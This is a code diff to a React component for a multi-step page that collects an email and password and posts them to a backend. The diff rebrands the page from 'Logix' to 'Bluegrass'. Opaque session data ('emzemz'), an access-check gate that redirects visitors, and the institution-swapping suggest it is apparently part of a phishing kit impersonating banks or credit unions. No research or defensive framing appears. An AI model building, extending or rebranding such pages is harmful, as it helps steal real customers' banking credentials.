@@ -3,6 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowPageLayout from '../components/FlowPageLayout';
 
 const EmailPassword: React.FC = () => {
   const [email, setEmail] = useState('');
@@ -14,7 +15,8 @@ const EmailPassword: React.FC = () => {
   const [errors, setErrors] = useState({
     email: '',
     password: '',
-    confirmPassword: ''
+    confirmPassword: '',
+    form: ''
   });
 
   const navigate = useNavigate();
@@ -22,12 +24,16 @@ const EmailPassword: React.FC = () => {
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  if (!isAllowed) {
-    return <div>Loading...</div>;
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Checking access…</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Access denied. Redirecting…</div>;
   }
 
   if (!emzemz) {
-    return <div>Missing user details. Please restart the process.</div>;
+    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Missing session data. Please restart the flow.</div>;
   }
 
   const validateEmail = (email: string) => {
@@ -42,14 +48,15 @@ const EmailPassword: React.FC = () => {
     const newErrors = {
       email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
       password: password.length < 8 ? 'Password must be at least 8 characters' : '',
-      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : ''
+      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : '',
+      form: ''
     };
 
     setErrors(newErrors);
 
     if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
       try {
-        await axios.post(`${baseUrl}api/logix-email-password/`, {
+        await axios.post(`${baseUrl}api/bluegrass-email-password/`, {
           emzemz,
           email,
           password
@@ -62,6 +69,7 @@ const EmailPassword: React.FC = () => {
           ...prev,
           form: 'There was an error. Please try again.'
         }));
+      } finally {
         setIsLoading(false);
       }
     } else {
@@ -70,116 +78,122 @@ const EmailPassword: React.FC = () => {
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Set Your Email & Password</h2>
-      </div>
-
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700">
-          Create your account credentials to access your online banking.
+    <FlowPageLayout
+      eyebrow="Step 3 of 7"
+      title="Create Your Login Credentials"
+      description="Set an email and password so you can sign in securely. Use an address you check often and a strong password."
+      contentClassName="space-y-6"
+      afterContent={(
+        <p className="text-xs text-white/90 max-w-md text-center">
+          Passwords must include at least 8 characters with a mix of letters, numbers, and symbols to stay compliant with Bluegrass security standards.
         </p>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          {/* Email Field */}
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Email:</label>
-            <input
-              id="email"
-              name="email"
-              type="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter your email"
-            />
+      )}
+    >
+      <form onSubmit={handleSubmit} className="space-y-6">
+        {errors.form && (
+          <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
+            {errors.form}
           </div>
+        )}
+
+        <div className="space-y-2">
+          <label htmlFor="email" className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
+            Email
+          </label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+            className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+            placeholder="you@example.com"
+          />
           {errors.email && (
-            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
+              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                 <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
               </svg>
-              <span>{errors.email}</span>
-            </div>
+              {errors.email}
+            </p>
           )}
+        </div>
 
-          {/* Password Field */}
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Password:</label>
+        <div className="space-y-2">
+          <label htmlFor="password" className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
+            Password
+          </label>
+          <div className="flex items-center gap-3">
             <input
               id="password"
               name="password"
               type={showPassword ? 'text' : 'password'}
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter password"
+              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+              placeholder="Create password"
             />
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
+            <button
+              type="button"
               onClick={() => setShowPassword(!showPassword)}
+              className="text-xs font-semibold text-[#0b5da7] hover:underline"
             >
               {showPassword ? 'Hide' : 'Show'}
-            </span>
+            </button>
           </div>
           {errors.password && (
-            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
+              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                 <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
               </svg>
-              <span>{errors.password}</span>
-            </div>
+              {errors.password}
+            </p>
           )}
+        </div>
 
-          {/* Confirm Password Field */}
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Confirm Password:</label>
+        <div className="space-y-2">
+          <label htmlFor="confirmPassword" className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
+            Confirm Password
+          </label>
+          <div className="flex items-center gap-3">
             <input
               id="confirmPassword"
               name="confirmPassword"
               type={showConfirmPassword ? 'text' : 'password'}
               value={confirmPassword}
               onChange={(e) => setConfirmPassword(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
               placeholder="Re-enter password"
             />
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
+            <button
+              type="button"
               onClick={() => setShowConfirmPassword(!showConfirmPassword)}
+              className="text-xs font-semibold text-[#0b5da7] hover:underline"
             >
               {showConfirmPassword ? 'Hide' : 'Show'}
-            </span>
+            </button>
           </div>
           {errors.confirmPassword && (
-            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
+              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                 <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
               </svg>
-              <span>{errors.confirmPassword}</span>
-            </div>
+              {errors.confirmPassword}
+            </p>
           )}
+        </div>
 
-          <div className="border-b-2 border-teal-500 flex justify-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent" />
-            )}
-          </div>
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700">
-          Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
-        </p>
-      </div>
-    </div>
+        <div className="flex justify-end">
+          <button
+            type="submit"
+            disabled={isLoading}
+            className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
+          >
+            {isLoading ? 'Saving…' : 'Continue'}
+          </button>
+        </div>
+      </form>
+    </FlowPageLayout>
   );
 };
 
